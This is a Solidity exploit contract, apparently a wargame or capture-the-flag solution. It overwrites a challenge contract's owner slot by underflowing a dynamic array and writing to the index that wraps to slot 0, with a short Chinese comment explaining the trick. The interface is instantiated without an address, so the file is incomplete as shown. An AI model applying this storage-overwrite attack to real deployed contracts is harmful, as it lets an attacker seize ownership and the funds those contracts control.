// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface Instance {

    function revise(uint, bytes32) external;
}

contract Attack {

    Instance instance = Instance();

    function attack() public {

        uint index = (uint256(2) ** uint256(256)) - uint256(keccak256(abi.encodePacked(uint256(1))));
        instance.revise(index, bytes32(uint256(uint160(msg.sender))));
    }
}

/**
 * https://mirror.xyz/xyyme.eth/5eu3_7f7275rqY-fNMUP5BKS8izV9Tshmv8Z5H9bsec
 * 要让数组上溢变为0，然后可以通过数组访问所有slot
 * owner存在slot(0)
 * keccak(slot(1)) + index = 2 ** 256
 */